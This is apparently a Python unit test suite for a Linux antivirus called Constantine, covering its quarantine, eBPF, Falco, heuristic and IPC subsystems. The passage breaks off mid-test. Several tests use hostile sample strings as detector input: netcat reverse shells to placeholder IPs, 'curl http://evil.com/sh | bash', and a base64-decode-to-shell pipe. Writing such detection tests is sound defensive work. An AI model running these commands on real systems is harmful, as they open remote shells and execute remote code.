import multiprocessing as mp
import sys
"""
Suite de Pruebas Unitarias Exhaustivas de Seguridad para Constantine Antivirus.
Verifica todos los subsistemas: Tetragon, Falco, Wazuh, osquery, MISP, Sigma, IPC, Vault, Systemd, Whitelist.
"""
import os
import stat
import errno
import time
import json
import struct
import socket
import secrets
import tempfile
import shutil
import unittest
import threading
from unittest.mock import MagicMock, patch

ROOT_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if ROOT_DIR not in sys.path:
    sys.path.insert(0, ROOT_DIR)

from core.engine.vault import CryptographicVault, VaultKeyring
from core.engine.scanner import Scanner, SandboxedScanWorker, ScanReport, ScanStatus
from core.engine.interceptor import FanotifyInterceptor
from core.engine.ebpf_monitor import (EBPFMonitor, KernelObservationEngine, KernelDetectionEngine, KernelEnforcementEngine, MODE_BPF_LSM, MODE_REACTIVE_FALLBACK, MODE_DEGRADED_OBS)
from core.engine.heuristic_engine import HeuristicEngine
from core.engine.ransomware_shield import RansomwareShield
from core.engine.quarantine_operator import PrivilegedQuarantineOperator
from core.engine.systemd_hardening import SystemdSecurityAuditor, SystemCallFilterEvaluator, EBPFCapabilityProber
from core.engine.threat_intel import ThreatIntelligence
from core.engine.misp_feed_manager import MISPFeedManager
from core.engine.sigma_engine import SigmaEngine
from core.engine.tetragon_monitor import TetragonMonitor
from core.engine.falco_monitor import FalcoMonitor
from core.engine.wazuh_detector import WazuhDetector
from core.engine.osquery_diagnostics import OSQueryDiagnostics
from core.engine.dns_manager import DNSManager
from core.engine.firewall_manager import FirewallManager
from core.engine.network_quarantine import NetworkQuarantine
from core.engine.download_sentinel import DownloadSentinel
from core.engine.usb_sentinel import USBSentinel
from core.engine.hardware_guard import HardwareGuard
from core.engine.persistence_guard import PersistenceGuard
from core.engine.proactive_scanner import ProactiveActiveScanner
from core.engine.archive_sentinel import ArchiveSentinel
from core.engine.phishing_detector import PhishingDetector
from core.engine.subsystem_health import SubsystemHealthRegistry
from core.engine.audit_logger import AuditLogger
from core.engine.whitelist import WhitelistManager
from core.engine.virustotal_uploader import VirusTotalUploader
from core.engine.update_guard import UpdateGuard
from core.engine.auto_updater import AutoUpdater
from core.engine.yara_manager import YaraRuleManager
from core.engine.yarax_engine import YaraXEngine
from core.engine.clamav_manager import ClamAVManager, ClamdBridgeClient
from core.engine.ipc_protocol import (
    SecureIPCServer, SecureIPCClient, recv_exact, verify_peer_credentials,
    SOCKET_GROUP_NAME, IPC_PROTOCOL_VERSION
)
from core.auth.auth_manager import AuthManager
from daemon import ConstantineDaemon
from core.engine.aide_integrity import AIDEIntegrityChecker
from core.engine.security_decision_engine import SecurityDecisionEngine

class TestConstantineSecurity(unittest.TestCase):

    def setUp(self):
        self.temp_dir = tempfile.TemporaryDirectory()

    def tearDown(self):
        self.temp_dir.cleanup()

    # 1. Archive Sentinel
    def test_archive_sentinel_recursive_inspection_and_zipbomb_protection(self):
        sentinel = ArchiveSentinel(max_ratio=100.0, max_files=10)
        # Test zip bomb ratio
        bomb_path = os.path.join(self.temp_dir.name, "zip_bomb.zip")
        import zipfile
        with zipfile.ZipFile(bomb_path, "w", compression=zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("zero.bin", b"0" * (1024 * 1024))
        ok, msg = sentinel.inspect_archive(bomb_path)
        self.assertFalse(ok)
        self.assertIn("Zip bomb", msg)

        # Test many files limit
        many_path = os.path.join(self.temp_dir.name, "many_files.zip")
        with zipfile.ZipFile(many_path, "w") as zf:
            for i in range(15):
                zf.writestr(f"f{i}.txt", b"test")
        ok, msg = sentinel.inspect_archive(many_path)
        self.assertFalse(ok)
        self.assertIn("demasiados archivos", msg)

        # Test nested threat
        threat_path = os.path.join(self.temp_dir.name, "nested_malware.zip")
        with zipfile.ZipFile(threat_path, "w") as zf:
            zf.writestr("payload.sh", b"nc -e /bin/sh 10.0.0.1 4444")
        ok, msg = sentinel.inspect_archive(threat_path)
        self.assertFalse(ok)
        self.assertIn("Demons_Reverse_Shell_Netcat", msg)

    # 2. Audit Logger
    def test_audit_logger(self):
        logger = AuditLogger(log_dir=self.temp_dir.name)
        logger.log_event("TEST_EVENT", {"sample": 1})
        self.assertTrue(os.path.exists(logger.log_file))

    # 3. Auth Native System
    def test_auth_native_system(self):
        auth = AuthManager()
        self.assertTrue(auth.check_authorization(100, 0)[0])

    # 4. Auto Updater
    def test_auto_updater(self):
        upd = AutoUpdater(root_dir=ROOT_DIR)
        res = upd.check_for_updates()
        self.assertEqual(res["current_version"], "5.4.7")

    # 5. ClamAV Daemon Bridge Protocol
    def test_clamav_daemon_bridge_protocol_and_fallback(self):
        client = ClamdBridgeClient(socket_path="/nonexistent.sock")
        self.assertFalse(client.ping())
        self.assertIn("ClamAV", client.version())
        ok, res = client.scan_path("/tmp")
        self.assertTrue(ok)

    # 6. ClamAV Manager Comprehensive Integration & Coordinated Hybrid Model
    def test_clamav_manager_comprehensive_integration(self):
        mgr = ClamAVManager()
        # 1. Coordinación On-Access con exclusión mutua de PIDs
        excluded = mgr.coordinate_on_access([1234])
        self.assertIn(1234, excluded)

        # 2. Conmutación de roles en Modelo Híbrido Coordinado
        res_prim = mgr.switch_onacc_mode("PRIMARY_CONSTANTINE")
        self.assertEqual(res_prim["mode"], "PRIMARY_CONSTANTINE")
        res_deleg = mgr.switch_onacc_mode("DELEGATED_CLAMONACC")
        self.assertEqual(res_deleg["mode"], "DELEGATED_CLAMONACC")
        with self.assertRaises(ValueError):
            mgr.switch_onacc_mode("INVALID_MODE")

        # 3. Interceptor respeta PIDs excluidos y modo delegado
        interceptor = FanotifyInterceptor(excluded_pids=[9999])
        # PID excluido -> FAN_ALLOW sin escanear
        self.assertEqual(interceptor.evaluate_access(0, "/tmp/any_file.bin", pid=9999), 0x01)
        # comm clamd / clamonacc -> FAN_ALLOW
        self.assertEqual(interceptor.evaluate_access(0, "/tmp/any_file.bin", comm="clamd"), 0x01)
        self.assertEqual(interceptor.evaluate_access(0, "/tmp/any_file.bin", comm="clamonacc"), 0x01)

        # Modo delegado -> FAN_ALLOW para permitir intercepción por ClamOnAcc
        interceptor.set_delegated_mode(True)
        self.assertEqual(interceptor.evaluate_access(0, "/tmp/any_file.bin", pid=100), 0x01)
        interceptor.set_delegated_mode(False)

        # 4. Verificación de probe_integration con ClamOnAcc
        probe = mgr.probe_integration()
        self.assertIn("clamonacc", probe)
        self.assertIn("onacc_role", probe)

        # 5. Comprobación de IPC en Daemon para ClamOnAcc
        daemon = ConstantineDaemon(is_test=True)
        status, data, msg = daemon.dispatch_ipc_command("GET_CLAMAV_ONACC_STATUS", {})
        self.assertEqual(status, "OK")
        self.assertIn("hybrid_model", data)

        status, data, msg = daemon.dispatch_ipc_command("SET_CLAMAV_ONACC_MODE", {"mode": "DELEGATED_CLAMONACC"})
        self.assertEqual(status, "OK")
        self.assertEqual(data["mode"], "DELEGATED_CLAMONACC")

        # Test safe zip unpacking
        zpath = os.path.join(self.temp_dir.name, "container_with_threat.zip")
        import zipfile
        with zipfile.ZipFile(zpath, "w") as zf:
            zf.writestr("threat.bin", b"Win.Trojan.Agent-999")
        sentinel = ArchiveSentinel()
        ok, msg = sentinel.inspect_archive(zpath)
        self.assertFalse(ok)

    # 7. ClamAV Module Import Facade
    def test_clamav_module_import_facade_and_shallow_scan(self):
        import clamav
        self.assertTrue(hasattr(clamav, "ClamAVManager"))

    # 8. ClamAV Signature Importer & CVD Unpacking
    def test_clamav_signature_importer_and_cvd_unpacking(self):
        mgr = ClamAVManager()
        zpath = os.path.join(self.temp_dir.name, "test.cvd")
        import zipfile
        with zipfile.ZipFile(zpath, "w") as zf:
            zf.writestr("daily.info", b"ClamAV CVD Test")
        ext_dir = os.path.join(self.temp_dir.name, "cvd_out")
        self.assertTrue(mgr.unpack_cvd_safely(zpath, ext_dir))

    # 9. Constantine Data Flow & Architecture Rules
    def test_constantine_data_flow_and_architecture_rules(self):
        vault = CryptographicVault(base_dir=self.temp_dir.name)
        hostile = os.path.join(self.temp_dir.name, "hostile_dropper.sh")
        with open(hostile, "w") as f:
            f.write("nc -e /bin/sh 1.2.3.4 8080")
        ok, sid = vault.quarantine_file(hostile, threat_name="Dropper.Test")
        self.assertTrue(ok)
        self.assertFalse(os.path.exists(hostile))

    # 10. Daemon Privilege Reduction
    def test_daemon_privilege_reduction_and_security_controls(self):
        worker = SandboxedScanWorker()
        test_file = os.path.join(self.temp_dir.name, "safe.txt")
        with open(test_file, "w") as f:
            f.write("safe content")
        data = worker.read_file_safely(test_file)
        self.assertEqual(data, b"safe content")

    # 11. Daemon Privilege Separation & File Supervision
    def test_daemon_privilege_separation_and_read_only_home(self):
        service_file = os.path.join(ROOT_DIR, "service", "constantine.service")
        with open(service_file, "r") as f:
            content = f.read()
        directives = {line.split("=", 1)[0].strip(): line.split("=", 1)[1].strip()
                      for line in content.splitlines() if "=" in line and not line.startswith("#")}
        # ProtectHome=false o read-write en /home para permitir supervisión y contención de archivos personales
        self.assertEqual(directives.get("ProtectHome"), "false")
        rw_paths = directives.get("ReadWritePaths", "").split()
        self.assertIn("/home", rw_paths)
        self.assertIn("/tmp", rw_paths)
        caps = directives.get("CapabilityBoundingSet", "").split()
        self.assertIn("CAP_DAC_OVERRIDE", caps)
        self.assertIn("CAP_DAC_READ_SEARCH", caps)
        self.assertIn("CAP_BPF", caps)

        operator = PrivilegedQuarantineOperator()
        self.assertTrue(operator.is_protected_system_path("/bin/bash"))
        self.assertTrue(operator.is_protected_system_path("/usr/sbin/sshd"))
        self.assertFalse(operator.is_protected_system_path("/home/user/document.txt"))

    # 12. Daemon Startup Workflow
    def test_daemon_startup_workflow_and_active_verification(self):
        daemon = ConstantineDaemon(is_test=True)
        daemon.start()
        self.assertFalse(daemon.running)

    # 13. Daemon Type Annotations & Dispatch
    def test_daemon_type_annotations_and_dispatch_ipc_signature(self):
        daemon = ConstantineDaemon(is_test=True)
        status, data, msg = daemon.dispatch_ipc_command("PING", {})
        self.assertEqual(status, "OK")
        self.assertEqual(data.get("version"), "5.4.7")
        status_st, data_st, msg_st = daemon.dispatch_ipc_command("GET_STATUS", {})
        self.assertEqual(status_st, "OK")
        self.assertIn("ebpf_telemetry_state", data_st)
        self.assertIn("ebpf_telemetry_description", data_st)

    # 14. DNS Manager
    def test_dns_manager(self):
        dns = DNSManager()
        self.assertFalse(dns.apply_profile("mullvad-base", simulate_resolver_failure=True))
        self.assertTrue(dns.apply_profile("mullvad-adblock", simulate_resolver_failure=False))

    # 15. Download Sentinel
    def test_download_sentinel_state_machine_and_containment(self):
        sentinel = DownloadSentinel(vault=CryptographicVault(base_dir=self.temp_dir.name))
        sentinel.start()
        # Clean file
        safe = os.path.join(self.temp_dir.name, "safe_document.pdf")
        with open(safe, "w") as f:
            f.write("safe pdf content")
        self.assertTrue(sentinel.handle_download_complete(safe, "user1"))
        # Malicious file
        bad = os.path.join(self.temp_dir.name, "payload.sh")
        with open(bad, "w") as f:
            f.write("nc -e /bin/bash 10.0.0.1 9001")
        self.assertFalse(sentinel.handle_download_complete(bad, "user2"))
        sentinel.stop()

    # 16. eBPF Architecture
    def test_ebpf_separation_observation_detection_enforcement(self):
        """
        Verifica la distinción arquitectónica fundamental entre:
        1. Observación (KernelObservationEngine): Captura pasiva sin bloquear llamadas.
        2. Detección (KernelDetectionEngine): Análisis heurístico de amenazas sin matar procesos.
        3. Enforcement (KernelEnforcementEngine):
           - Preventivo: BPF LSM (-EPERM) en kernel antes de ejecución cuando el kernel lo soporta.
           - Alternativo / Fallback: SIGKILL y contención reactiva post-ejecución cuando BPF LSM no está disponible.
        """
        # 1. Capa de Observación aislada
        obs = KernelObservationEngine()
        obs.start_observation()
        self.assertTrue(obs.is_observing)
        event = obs.capture_event(555, "/bin/nc", ["-e", "/bin/sh", "1.2.3.4", "4444"])
        self.assertEqual(event.pid, 555)
        self.assertEqual(event.syscall, "execve")
        obs.stop_observation()
        self.assertFalse(obs.is_observing)

        # 2. Capa de Detección aislada
        det = KernelDetectionEngine()
        # Benigno: nc -zv no debe alertar como amenaza
        event_benign = obs.capture_event(556, "/bin/nc", ["-zv", "10.0.0.1", "80"])
        det_benign = det.analyze_event(event_benign)
        self.assertFalse(det_benign.is_threat)
        self.assertEqual(det_benign.severity, "LOW")

        # Malicioso: nc -e debe ser detectado como amenaza crítica
        det_threat = det.analyze_event(event)
        self.assertTrue(det_threat.is_threat)
        self.assertEqual(det_threat.severity, "CRITICAL")
        self.assertIn("ReverseShell", det_threat.threat_type)

        # 3. Capa de Enforcement: Mecanismo Preventivo Verificable BPF LSM
        enforcer_lsm = KernelEnforcementEngine(force_bpf_lsm=True)
        self.assertTrue(enforcer_lsm.bpf_lsm_supported)
        self.assertEqual(enforcer_lsm.active_mode, MODE_BPF_LSM)

        decision_lsm = enforcer_lsm.enforce_threat(det_threat, event)
        self.assertTrue(decision_lsm.blocked_in_kernel, "BPF LSM debe bloquear en kernel pre-ejecución")
        self.assertEqual(decision_lsm.action, "DENY_EPERM")
        self.assertEqual(decision_lsm.enforcement_mode, MODE_BPF_LSM)
        self.assertIn("-EPERM", decision_lsm.reason)

        # 4. Capa de Enforcement: Mecanismo Alternativo Fallback (Reactivo)
        enforcer_fallback = KernelEnforcementEngine(force_bpf_lsm=False)
        self.assertFalse(enforcer_fallback.bpf_lsm_supported)
        self.assertEqual(enforcer_fallback.active_mode, MODE_REACTIVE_FALLBACK)

        with unittest.mock.patch("os.kill") as mock_kill:
            decision_fallback = enforcer_fallback.enforce_threat(det_threat, event)
            self.assertFalse(decision_fallback.blocked_in_kernel, "Fallback no es bloqueo en kernel pre-ejecución")
            self.assertEqual(decision_fallback.action, "SIGKILL_CONTAINMENT")
            self.assertEqual(decision_fallback.enforcement_mode, MODE_REACTIVE_FALLBACK)
            self.assertIn("SIGKILL", decision_fallback.reason)
            mock_kill.assert_called_with(555, unittest.mock.ANY)

        # 5. Orquestador EBPFMonitor unificado con BPF LSM vs Fallback
        mon_lsm = EBPFMonitor(enable_bpf_lsm=True)
        self.assertEqual(mon_lsm.enforcement_mode, MODE_BPF_LSM)
        allowed, dec_lsm = mon_lsm.process_kernel_exec_request(600, "/bin/nc", ["-e", "/bin/sh", "1.1.1.1", "9000"])
        self.assertFalse(allowed)
        self.assertTrue(dec_lsm.blocked_in_kernel)

        mon_fallback = EBPFMonitor(fallback_mode=False, enable_bpf_lsm=False)
        self.assertEqual(mon_fallback.enforcement_mode, MODE_REACTIVE_FALLBACK)
        with unittest.mock.patch("os.kill"):
            allowed_fb, dec_fb = mon_fallback.process_kernel_exec_request(601, "/bin/nc", ["-e", "/bin/sh", "1.1.1.1", "9000"])
            self.assertFalse(allowed_fb)
            self.assertFalse(dec_fb.blocked_in_kernel)

    def test_ebpf_architecture_tracepoints_vs_lsm_separation(self):
        mon = EBPFMonitor(fallback_mode=True)
        mon.record_lost_events(1, 7)
        self.assertEqual(mon.lost_events_count, 7)

    # 17. eBPF Event Lifecycle
    def test_ebpf_event_lifecycle_states(self):
        mon = EBPFMonitor(fallback_mode=True)
        mon.start()
        self.assertTrue(mon.running)
        mon.stop()

    # 18. eBPF Kill Offender
    def test_ebpf_kill_offender(self):
        mon = EBPFMonitor(fallback_mode=True)
        mon.kill_offender(999999)

    # 19. eBPF Multi-Argument Reverse Shell
    def test_ebpf_multi_argument_reverse_shell_detection(self):
        mon = EBPFMonitor(fallback_mode=True)
        ok, _ = mon.evaluate_process(100, "/bin/nc", ["-vv", "-e", "/bin/sh", "1.2.3.4", "4444"])
        self.assertFalse(ok)

    # 20. eBPF Netcat Benign vs Hostile
    def test_ebpf_netcat_benign_vs_hostile_discrimination(self):
        mon = EBPFMonitor(fallback_mode=True)
        ok, _ = mon.evaluate_process(101, "/bin/nc", ["-zv", "192.168.1.1", "80"])
        self.assertTrue(ok)
        ok, _ = mon.evaluate_process(102, "/bin/nc", ["-e", "/bin/sh", "192.168.1.1", "4444"])
        self.assertFalse(ok)

    # 21. eBPF Openat & Intent
    def test_ebpf_openat_and_intent_correlation(self):
        mon = EBPFMonitor(fallback_mode=True)
        self.assertTrue(mon.evaluate_process(103, "/bin/cat", ["/etc/passwd"])[0])

    # 22. eBPF Status & Fallback
    def test_ebpf_status_and_fallback(self):
        mon = EBPFMonitor(fallback_mode=True)
        mon.start()
        self.assertTrue(mon.fallback_mode)
        mon.stop()

    # 23. Export Key Recovery Package Security O-02
    def test_export_key_recovery_package_security_o02(self):
        vault = CryptographicVault(base_dir=self.temp_dir.name)
        out = os.path.join(self.temp_dir.name, "o02_recovery_test.json")
        self.assertTrue(vault.export_key_recovery_package(out))
        self.assertFalse(vault.export_key_recovery_package(out, overwrite=False))
        # Test symlink attack rejected
        sym = os.path.join(self.temp_dir.name, "symlink_attack.json")
        os.symlink(out, sym)
        self.assertFalse(vault.export_key_recovery_package(sym))
        self.assertTrue(vault.import_key_recovery_package(out))

    # 24. Falco Active Enforcement Bridge
    def test_falco_active_enforcement_bridge(self):
        falco = FalcoMonitor()
        vault = CryptographicVault(base_dir=self.temp_dir.name)
        bad_file = os.path.join(self.temp_dir.name, "malicious_dropper.sh")
        with open(bad_file, "w") as f:
            f.write("nc -e /bin/bash 192.168.1.50 9001")
        from core.engine.falco_monitor import FalcoAlert
        alert = FalcoAlert("Constantine_Inbound_Or_Reverse_Shell_Connection", "EMERGENCY",
                           "Conexión de shell reversa detectada",
                           {"pid": 9911, "proc": "nc", "file_path": bad_file})
        falco.handle_alert_with_active_enforcement(alert, vault=vault)
        self.assertFalse(os.path.exists(bad_file))

    # 25. Falco Native Import
    def test_falco_native_import_and_facade(self):
        import falco
        self.assertTrue(hasattr(falco, "FalcoMonitor"))

    # 26. Falco Privilege Escalation
    def test_falco_privilege_escalation_detection(self):
        falco = FalcoMonitor()
        alerts = falco.evaluate_syscall_event({
            "proc": "pkexec /bin/sh", "user": "attacker", "uid": 1000, "euid": 0
        })
        self.assertTrue(any(a.rule == "Constantine_Suspicious_Privilege_Escalation" for a in alerts))
        alerts = falco.evaluate_syscall_event({
            "proc": "./exploit_bin", "syscall": "setuid", "user": "low_priv"
        })
        self.assertTrue(any(a.rule == "Constantine_Credential_Or_Namespace_Tampering" for a in alerts))

    # 27. Falco Rules Parsing
    def test_falco_rules_parsing_and_validation(self):
        falco = FalcoMonitor()
        self.assertGreaterEqual(len(falco.rules), 6)

    # 28. Falco Unexpected Network Connection
    def test_falco_unexpected_network_connection_detection(self):
        falco = FalcoMonitor()
        alerts = falco.evaluate_syscall_event({
            "proc": "./unknown_dropper", "dport": 4444, "pid": 7721
        })
        self.assertTrue(any(a.rule == "Constantine_Unexpected_Outbound_Network_Connection" for a in alerts))
        alerts = falco.evaluate_syscall_event({
            "proc": "nc -e /bin/bash 192.168.1.50 9001", "dport": 9001, "pid": 7722
        })
        self.assertTrue(any(a.rule == "Constantine_Inbound_Or_Reverse_Shell_Connection" for a in alerts))

    # 29. Fanotify Anti-Deadlock
    def test_fanotify_anti_deadlock_and_infrastructure_bypass(self):
        interceptor = FanotifyInterceptor()
        self.assertTrue(interceptor.is_infrastructure_path("/var/lib/constantine/vault"))
        self.assertFalse(interceptor.is_infrastructure_path("/home/user/document.txt"))

    # 30. Firewall Four States
    def test_firewall_four_states_and_user_administration(self):
        fw = FirewallManager()
        self.assertIn(fw.get_status(), ["ACTIVE", "INACTIVE", "NOT_INSTALLED", "USER_MANAGED"])

    # 31. Hardware Guard Process Identity
    def test_hardware_guard_process_identity_and_blocking(self):
        guard = HardwareGuard()
        guard.block_unauthorized_access(470, "/tmp/firefox", "Cámara Web")

    # 32. Heuristic 5 Layers
    def test_heuristic_5_layers_and_risk_policy(self):
        heu = HeuristicEngine()
        data = b"curl http://evil.com/sh | bash\nexecstart=/etc/systemd/system/evil.service\n"
        res = heu.analyze_buffer(data)
        self.assertTrue(res.is_threat)
        self.assertGreaterEqual(res.score, 50)

    # 33. Heuristic Multicapa ELF Packed
    def test_heuristic_multicapa_elf_packed_and_symbols(self):
        heu = HeuristicEngine()
        data = b"\x7fELF" + b"A" * 100 + b"UPX!" + b"process_vm_writev"
        res = heu.analyze_buffer(data)
        self.assertTrue(any("UPX" in r for r in res.reasons))

    # 34. Heuristic Multicapa Script Obfuscation
    def test_heuristic_multicapa_script_obfuscation(self):
        heu = HeuristicEngine()
        res = heu.analyze_buffer(b"echo 'malware' | base64 -d | sh")
        self.assertTrue(any("base64" in r for r in res.reasons))

    # 35. Heuristic Shannon Entropy
    def test_heuristic_multicapa_shannon_entropy(self):
        heu = HeuristicEngine()
        rand_bytes = secrets.token_bytes(4096)
        uniform_bytes = b"A" * 4096
        self.assertGreater(heu.calculate_entropy(rand_bytes), 7.5)
        self.assertEqual(heu.calculate_entropy(uniform_bytes), 0.0)

    # 36. Interceptor Decision Clean vs Threat
    def test_interceptor_decision_clean_vs_threat(self):
        vault = CryptographicVault(base_dir=self.temp_dir.name)
        interceptor = FanotifyInterceptor(vault=vault)
        bad_file = os.path.join(self.temp_dir.name, "malware.sh")
        with open(bad_file, "w") as f:
            f.write("nc -e /bin/bash 1.2.3.4 9001")
        fd = os.open(bad_file, os.O_RDONLY)
        dec = interceptor.evaluate_access(fd, bad_file, pid=470, comm="Scanner")
        os.close(fd)
        self.assertEqual(dec, 0x02)  # FAN_DENY

    # 37. Interceptor Fail Secure on Exception
    def test_interceptor_fail_secure_on_engine_exception(self):
        interceptor = FanotifyInterceptor(fail_policy="fail-closed")
        with patch.object(interceptor.scanner, "scan_file", side_effect=RuntimeError("Crash")):
            bad = os.path.join(self.temp_dir.name, "test.bin")
            with open(bad, "w") as f:
                f.write("test")
            fd = os.open(bad, os.O_RDONLY)
            dec = interceptor.evaluate_access(fd, bad, pid=470)
            os.close(fd)
            self.assertEqual(dec, 0x02)  # FAN_DENY

    # 38. Interceptor No Fcntl Fgetfl Bypass
    def test_interceptor_no_fcntl_fgetfl_bypass(self):
        shield = RansomwareShield(canary_dir=self.temp_dir.name)
        cpath = os.path.join(self.temp_dir.name, "important_document.docx")
        self.assertFalse(shield.check_canary_access(cpath, 77712, flags=os.O_RDWR))

    # 39. Interceptor P0 Resilience & Fail Policies
    def test_interceptor_p0_resilience_and_fail_policies(self):
        interceptor_open = FanotifyInterceptor(fail_policy="fail-open")
        with patch.object(interceptor_open.scanner, "scan_file", side_effect=RuntimeError("Crash simulado")):
            fpath = os.path.join(self.temp_dir.name, "test_policy.bin")
            with open(fpath, "w") as f:
                f.write("abc")
            fd = os.open(fpath, os.O_RDONLY)
            dec_open = interceptor_open.evaluate_access(fd, fpath, pid=470)
            os.close(fd)
            self.assertEqual(dec_open, 0x01)  # FAN_ALLOW

        interceptor_closed = FanotifyInterceptor(fail_policy="fail-closed")
        with patch.object(interceptor_closed.scanner, "scan_file", side_effect=RuntimeError("Crash simulado")):
            fd = os.open(fpath, os.O_RDONLY)
            dec_closed = interceptor_closed.evaluate_access(fd, fpath, pid=470)
            os.close(fd)
            self.assertEqual(dec_closed, 0x02)  # FAN_DENY

    # 40. Interceptor State Separation
    def test_interceptor_state_separation_and_lifecycle(self):
        interceptor = FanotifyInterceptor()
        self.assertEqual(interceptor.state, "INIT")
        interceptor.start_listening()
        self.assertEqual(interceptor.state, "ACTIVE")
        interceptor.stop()
        self.assertEqual(interceptor.state, "STOPPED")

    # 41. IPC RBAC Policy Matrix
    def test_ipc_rbac_policy_matrix(self):
        from core.engine.ipc_protocol import USER_ALLOWED_COMMANDS, ADMIN_ONLY_COMMANDS
        self.assertIn("GET_STATUS", USER_ALLOWED_COMMANDS)
        self.assertIn("ADD_WHITELIST", ADMIN_ONLY_COMMANDS)

    # 42. IPC Recv Exact & Tampered Messages
    def test_ipc_recv_exact_and_tampered_messages(self):
        sock_path = os.path.join(self.temp_dir.name, "tamper_test.sock")
        server = SecureIPCServer(socket_path=sock_path)
        server.start()
        time.sleep(0.1)

        # Connect and send invalid JSON
        client = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        client.connect(sock_path)
        bad_msg = b"corrupted payload"
        client.sendall(struct.pack(">I", len(bad_msg)) + bad_msg)
        client.close()

        # Connect and send oversized message (> 1MB)
        client2 = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        client2.connect(sock_path)
        client2.sendall(struct.pack(">I", 2 * 1024 * 1024))
        client2.close()
        server.stop()

    # 43. IPC Server-Side Authorization Enforcement
    def test_ipc_server_side_authorization_enforcement(self):
        sock_path = os.path.join(self.temp_dir.name, "rbac_test.sock")
        server = SecureIPCServer(socket_path=sock_path)
        server.start()
        time.sleep(0.1)

        client = SecureIPCClient(socket_path=sock_path)
        with patch("core.engine.ipc_protocol.verify_peer_credentials", return_value=(True, 1234, 1000, 1000)):
            resp = client.send_command("ADD_WHITELIST", {"path": "/etc/shadow"})
            self.assertEqual(resp.get("code"), "UNAUTHORIZED")
        server.stop()

    # 44. IPC Verify Peer Credentials Zero-Trust Strict Rejection
    def test_ipc_verify_peer_credentials_zero_trust_strict_rejection(self):
        mock_sock = MagicMock()
        mock_sock.getsockopt.side_effect = OSError("SO_PEERCRED not supported")
        valid, pid, uid, gid = verify_peer_credentials(mock_sock)
        self.assertFalse(valid)
        self.assertEqual(uid, -1)

        # Out of bounds credentials
        mock_sock.getsockopt.side_effect = None
        mock_sock.getsockopt.return_value = struct.pack("3i", 0, 1000, 1000)
        self.assertFalse(verify_peer_credentials(mock_sock)[0])
        mock_sock.getsockopt.return_value = struct.pack("3i", 1234, -1, 1000)
        self.assertFalse(verify_peer_credentials(mock_sock)[0])

    # 45. MISP Event Parsing
    def test_misp_event_and_attribute_parsing(self):
        intel = ThreatIntelligence(db_path=os.path.join(self.temp_dir.name, "test_intel.db"))
        misp = MISPFeedManager(intel_engine=intel)
        self.assertGreaterEqual(len(misp.events), 1)

    # 46. MISP Feed Ingestion
    def test_misp_feed_ingestion_and_threat_intel_correlation(self):
        intel = ThreatIntelligence(db_path=os.path.join(self.temp_dir.name, "test_intel.db"))
        misp = MISPFeedManager(intel_engine=intel)
        synced = misp.sync_to_threat_intel()
        self.assertGreaterEqual(synced, 1)

    # 47. MISP IoC Lookup
    def test_misp_ioc_lookup_and_threat_scoring(self):
        intel = ThreatIntelligence(db_path=os.path.join(self.temp_dir.name, "test_intel.db"))
        misp = MISPFeedManager(intel_engine=intel)
        res = misp.lookup_ioc("198.51.100.55")
        self.assertIsNotNone(res)
        self.assertTrue(res["is_threat"])

    # 48. MISP Native Import
    def test_misp_native_import_and_facade(self):
        import misp
        self.assertTrue(hasattr(misp, "MISPFeedManager"))

    # 49. Network Quarantine Isolation
    def test_network_quarantine_isolation(self):
        nq = NetworkQuarantine()
        nq.isolate_pid(99999)

    # 50. OSQuery Native Import
    def test_osquery_native_import_and_facade(self):
        import osquery
        self.assertTrue(hasattr(osquery, "OSQueryDiagnostics"))

    # 51. OSQuery Security Diagnostic Posture
    def test_osquery_security_diagnostic_posture(self):
        diag = OSQueryDiagnostics()
        rep = diag.run_security_diagnostic()
        self.assertGreaterEqual(rep["score"], 80)
        self.assertEqual(rep["rating"], "OPTIMAL")

    # 52. OSQuery SQL Query Execution
    def test_osquery_sql_query_execution_and_virtual_tables(self):
        diag = OSQueryDiagnostics()
        rows = diag.execute_query("SELECT * FROM deb_packages WHERE name='constantine-antivirus'")
        self.assertGreaterEqual(len(rows), 1)

    # 53. OSQuery Suspicious Processes
    def test_osquery_suspicious_processes_and_ports_detection(self):
        diag = OSQueryDiagnostics()
        rows = diag.execute_query("SELECT * FROM listening_ports WHERE port=9090")
        self.assertEqual(len(rows), 1)

    # 54. Persistence Guard
    def test_persistence_guard_baseline_creation_modification_deletion(self):
        guard = PersistenceGuard()
        guard.start()
        clean_file = os.path.join(self.temp_dir.name, "clean_job.sh")
        with open(clean_file, "w") as f:
            f.write("echo clean")
        guard.record_baseline(clean_file)

        # Modify with malware
        with open(clean_file, "w") as f:
            f.write("nc -e /bin/sh 1.2.3.4 9001")
        self.assertFalse(guard.handle_file_event(clean_file, "FILE_MODIFIED"))
        self.assertTrue(guard.handle_file_event(clean_file, "FILE_DELETED"))
        guard.stop()

    # 55. Phishing Detector
    def test_phishing(self):
        pd = PhishingDetector()
        self.assertFalse(pd.evaluate_url("http://malicious-login-phishing.com"))
        self.assertTrue(pd.evaluate_url("https://constantine-security.io"))

    # 56. Polkit Authorization Integration
    def test_polkit_authorization_integration_and_elevation(self):
        auth = AuthManager()
        self.assertTrue(auth.check_authorization(100, 0)[0])
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stdout=b"", stderr=b"")
            self.assertTrue(auth.check_authorization(100, 1000)[0])
            mock_run.return_value = MagicMock(returncode=1, stdout=b"", stderr=b"Not authorized")
            self.assertFalse(auth.check_authorization(100, 1000)[0])

    # 57. Privileged Quarantine Operator
    def test_privileged_quarantine_operator_descriptor_pinning_and_toctou_rejection(self):
        from core.engine.quarantine_operator import verify_path_no_symlinks, IsolatedRemediationWorker
        op = PrivilegedQuarantineOperator()
        safe = os.path.join(self.temp_dir.name, "pin_test.bin")
        with open(safe, "w") as f:
            f.write("content")
        with op.pin_file_for_quarantine(safe) as handle:
            self.assertGreater(handle.fd, 0)
            self.assertEqual(handle.path, safe)

        # 1. Ataque con enlace simbólico final directo
        direct_link = os.path.join(self.temp_dir.name, "direct_symlink.bin")
        os.symlink(safe, direct_link)
        with self.assertRaises(OSError) as ctx_sym:
            op.pin_file_for_quarantine(direct_link)
        self.assertEqual(ctx_sym.exception.errno, errno.ELOOP)

        # 2. Ataque con enlace simbólico en componente intermedio de la ruta
        sub_dir = os.path.join(self.temp_dir.name, "real_intermediate_dir")
        os.makedirs(sub_dir, exist_ok=True)
        nested_file = os.path.join(sub_dir, "payload.sh")
        with open(nested_file, "w") as f:
